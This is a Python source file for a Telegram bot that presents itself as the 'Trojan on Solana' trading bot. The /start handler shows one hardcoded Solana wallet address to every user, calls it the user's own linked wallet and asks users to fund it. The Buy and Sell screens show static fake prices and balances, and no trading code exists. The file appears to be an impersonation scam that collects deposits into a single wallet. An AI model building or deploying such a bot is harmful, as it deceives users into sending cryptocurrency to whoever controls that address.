import logging
import os
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from urllib.parse import quote  # Use this instead of url_quote

# Set up logging to monitor errors and debug information
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Buy", callback_data="buy"),
            InlineKeyboardButton("Sell", callback_data="sell"),
        ],
        [
            InlineKeyboardButton("Positions", callback_data="positions"),
            InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
        ],
        [
            InlineKeyboardButton("Referrals", callback_data="referrals"),
            InlineKeyboardButton("Withdraw", callback_data="withdraw"),
        ],
        [
            InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
            InlineKeyboardButton("Settings", callback_data="settings"),
        ],
        [InlineKeyboardButton("Help", callback_data="help")],
    ])

# Function to handle the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    video_path = "WhatsApp Video 2024-12-03 at 12.58.12 AM.mp4"  # Relative path

    try:
        if os.path.exists(video_path):
            with open(video_path, 'rb') as video_file:
                await context.bot.send_video(
                    chat_id=update.effective_chat.id,
                    video=video_file,
                    caption="Welcome to Trojan on Solana! 🎥"
                )
        else:
            logger.error(f"Video file not found at {video_path}")
            await update.message.reply_text("Error: Welcome video not available.")
            return
    except Exception as e:
        logger.error(f"Error sending video: {e}")
        await update.message.reply_text("Error: Could not send video.")

    # Send the welcome text
    welcome_message = (
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "Here's your Solana wallet address linked to your Telegram account. "
        "Simply fund your wallet and dive into trading.\n\n"
        "Solana Wallet Address:\n"
        "AVXRzamEeoLD5vUUwdauK8928KPJ9iFuR163SYh28vy1\n\n"
        "TAP TO COPY\n\n"
        "Balance: (0.00) SOL\n\n"
        "Click on the Refresh button to update your current balance.\n\n"
        "Join our Telegram group @trojan for users of Trojan!\n\n"
        "Use the following bots for faster trading:\n"
        "@achilles_trojanbot | @odysseus_trojanbot | @Menelaus_trojanbot | "
        "@Diomedes_trojanbot | @Paris_trojanbot | @Helenus_trojanbot | @Hector_trojanbot"
    )
    await update.message.reply_text(welcome_message, reply_markup=main_menu_keyboard())

# Individual functions for each menu button
async def buy_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Buy $SLND- (Solend) 📈\n\n"
        "Balance: -_- SOL - W1 ✏️\n\n"
        "Price: $0.3594 - LIQ: $17.48K - MC: $35.94M\n\n"
        "🔴 Insufficient balance for buy amount + gas."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

async def sell_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Sell $SLND- (Solend) 📉\n\n"
        "Balance: 2.419 SOL\n\n"
        "Price: $0.3594 - LIQ: $17.48K - MC: $35.94M\n\n"
        "Ready to sell? Please confirm the amount."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

# Define similar functions for the other buttons (positions, limit_orders, referrals, etc.)

# Function to start the bot using polling
def run_bot():
    token = os.getenv("TELEGRAM_BOT_TOKEN")  # Use an environment variable
    if not token:
        raise ValueError("Bot token not set. Set TELEGRAM_BOT_TOKEN environment variable.")

    application = Application.builder().token(token).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))

    # CallbackQuery Handlers
    application.add_handler(CallbackQueryHandler(buy_handler, pattern="^buy$"))
    application.add_handler(CallbackQueryHandler(sell_handler, pattern="^sell$"))
    # Add handlers for other buttons here...

    logger.info("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    run_bot()
